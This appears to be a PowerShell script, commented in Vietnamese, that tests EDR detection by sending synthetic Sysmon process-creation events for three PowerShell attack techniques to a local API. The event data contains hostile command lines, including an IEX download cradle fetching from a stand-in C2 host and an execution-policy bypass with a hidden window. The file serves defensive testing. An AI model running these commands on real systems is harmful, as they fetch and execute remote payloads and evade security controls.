# PowerShell Attack Simulation
# Mô phỏng các cuộc tấn công sử dụng PowerShell vào endpoint

param(
    [string]$EDREndpoint = "http://localhost:8080/api/v2/events",
    [int]$DelaySeconds = 2
)

Add-Type -AssemblyName System.Web

function Send-Event {
    param([hashtable]$Event)
    
    $json = $Event | ConvertTo-Json -Depth 10
    try {
        $response = Invoke-RestMethod -Uri $EDREndpoint -Method POST -Body $json -ContentType "application/json"
        Write-Host "[SUCCESS] Event sent. Alerts: $($response.alerts_generated)" -ForegroundColor Green
        return $response.alerts_generated
    }
    catch {
        Write-Host "[ERROR] Failed to send: $($_.Exception.Message)" -ForegroundColor Red
        return 0
    }
}

Write-Host "=== POWERSHELL ATTACK SIMULATION ===" -ForegroundColor Yellow
Write-Host "Target: Windows Endpoint via PowerShell exploitation" -ForegroundColor White

$totalAlerts = 0

# ATTACK 1: Encoded PowerShell Command
# Mô tả: Kẻ tấn công sử dụng Base64 encoding để ẩn payload
# Kỹ thuật: T1059.001 - PowerShell (MITRE ATT&CK)
Write-Host "`n[ATTACK 1] Encoded PowerShell Command Execution" -ForegroundColor Cyan
Write-Host "- Mô tả: Thực thi lệnh PowerShell được mã hóa Base64" -ForegroundColor Gray
Write-Host "- MITRE ATT&CK: T1059.001 - Command and Scripting Interpreter: PowerShell" -ForegroundColor Gray
Write-Host "- Nguy hiểm: Cao - Có thể thực thi bất kỳ code nào mà không bị phát hiện dễ dàng" -ForegroundColor Gray

$event1 = @{
    "@timestamp" = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    "id" = "ps-encoded-attack-1"
    "logsource" = @{
        "category" = "process_creation"  # Loại log: tạo process
        "product" = "windows"            # Hệ điều hành: Windows
    }
    "EventID" = 1                       # Sysmon Event ID 1: Process creation
    "Image" = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  # Đường dẫn executable
    # Base64 của "Invoke-WebRequest" - lệnh download file từ internet
    "CommandLine" = "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
    "ProcessId" = 1234                  # Process ID giả lập
    "ParentImage" = "C:\Windows\System32\cmd.exe"  # Process cha
    "User" = "DESKTOP-ENDPOINT\victim"  # Tài khoản bị tấn công
    "LogonId" = "0x12345"              # Session ID
    "TerminalSessionId" = 1            # Terminal session
    "IntegrityLevel" = "Medium"        # Mức độ quyền
    "Hashes" = "SHA1=A1B2C3D4E5F6"    # Hash của file (giả lập)
    "ParentProcessId" = 567
    "ParentCommandLine" = "cmd.exe"
    "CurrentDirectory" = "C:\Users\victim\"
    "OriginalFileName" = "PowerShell.EXE"
    "FileVersion" = "10.0.19041.1"
}
$totalAlerts += Send-Event -Event $event1
Start-Sleep $DelaySeconds

# ATTACK 2: PowerShell Download Cradle
# Mô tả: Tải và thực thi script từ internet
# Kỹ thuật: T1105 - Ingress Tool Transfer
Write-Host "`n[ATTACK 2] PowerShell Download Cradle" -ForegroundColor Cyan
Write-Host "- Mô tả: Tải và thực thi script độc hại từ internet" -ForegroundColor Gray
Write-Host "- MITRE ATT&CK: T1105 - Ingress Tool Transfer" -ForegroundColor Gray
Write-Host "- Nguy hiểm: Rất cao - Cho phép tải payload từ C2 server" -ForegroundColor Gray

$event2 = @{
    "@timestamp" = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    "id" = "ps-download-attack-2"
    "logsource" = @{
        "category" = "process_creation"
        "product" = "windows"
    }
    "EventID" = 1
    "Image" = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    # IEX (Invoke-Expression) + DownloadString = Download cradle pattern
    "CommandLine" = "powershell.exe -Command `"IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.com/payload.ps1')`""
    "ProcessId" = 2345
    "ParentImage" = "C:\Windows\System32\cmd.exe"
    "User" = "DESKTOP-ENDPOINT\victim"
    "LogonId" = "0x12346"
    "TerminalSessionId" = 1
    "IntegrityLevel" = "Medium"
    "Hashes" = "SHA1=A1B2C3D4E5F6"
    "ParentProcessId" = 567
    "ParentCommandLine" = "cmd.exe"
    "CurrentDirectory" = "C:\Users\victim\"
    "OriginalFileName" = "PowerShell.EXE"
    "FileVersion" = "10.0.19041.1"
}
$totalAlerts += Send-Event -Event $event2
Start-Sleep $DelaySeconds

# ATTACK 3: PowerShell Execution Policy Bypass
# Mô tả: Bỏ qua chính sách bảo mật PowerShell
# Kỹ thuật: T1562.001 - Impair Defenses: Disable or Modify Tools
Write-Host "`n[ATTACK 3] PowerShell Execution Policy Bypass" -ForegroundColor Cyan
Write-Host "- Mô tả: Bỏ qua Execution Policy để chạy script không được ký" -ForegroundColor Gray
Write-Host "- MITRE ATT&CK: T1562.001 - Impair Defenses: Disable or Modify Tools" -ForegroundColor Gray
Write-Host "- Nguy hiểm: Trung bình - Cho phép chạy script độc hại" -ForegroundColor Gray

$event3 = @{
    "@timestamp" = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    "id" = "ps-bypass-attack-3"
    "logsource" = @{
        "category" = "process_creation"
        "product" = "windows"
    }
    "EventID" = 1
    "Image" = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    # -ExecutionPolicy Bypass: Bỏ qua policy
    # -WindowStyle Hidden: Ẩn cửa sổ
    "CommandLine" = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Get-Process; whoami`""
    "ProcessId" = 3456
    "ParentImage" = "C:\Windows\System32\cmd.exe"
    "User" = "DESKTOP-ENDPOINT\victim"
    "LogonId" = "0x12347"
    "TerminalSessionId" = 1
    "IntegrityLevel" = "Medium"
    "Hashes" = "SHA1=A1B2C3D4E5F6"
    "ParentProcessId" = 567
    "ParentCommandLine" = "cmd.exe"
    "CurrentDirectory" = "C:\Users\victim\"
    "OriginalFileName" = "PowerShell.EXE"
    "FileVersion" = "10.0.19041.1"
}
$totalAlerts += Send-Event -Event $event3
Start-Sleep $DelaySeconds

# Summary
Write-Host "`n=== POWERSHELL ATTACK SUMMARY ===" -ForegroundColor Yellow
Write-Host "Events sent: 3" -ForegroundColor White
Write-Host "Alerts generated: $totalAlerts" -ForegroundColor $(if ($totalAlerts -gt 0) { "Green" } else { "Red" })
Write-Host "Detection rate: $(($totalAlerts / 3 * 100).ToString('F1'))%" -ForegroundColor $(if ($totalAlerts -gt 1) { "Green" } else { "Red" })

Write-Host "`n[GIẢI THÍCH KỸ THUẬT]" -ForegroundColor Magenta
Write-Host "1. Encoded Command: Sử dụng Base64 để ẩn payload thực sự" -ForegroundColor White
Write-Host "2. Download Cradle: Pattern IEX + DownloadString để tải code từ internet" -ForegroundColor White
Write-Host "3. Policy Bypass: Tham số -ExecutionPolicy Bypass để vượt qua bảo mật" -ForegroundColor White
Write-Host "4. Tất cả đều tạo Sysmon Event ID 1 (Process Creation)" -ForegroundColor White
Write-Host "5. Sigma rules sẽ detect dựa trên CommandLine patterns" -ForegroundColor White
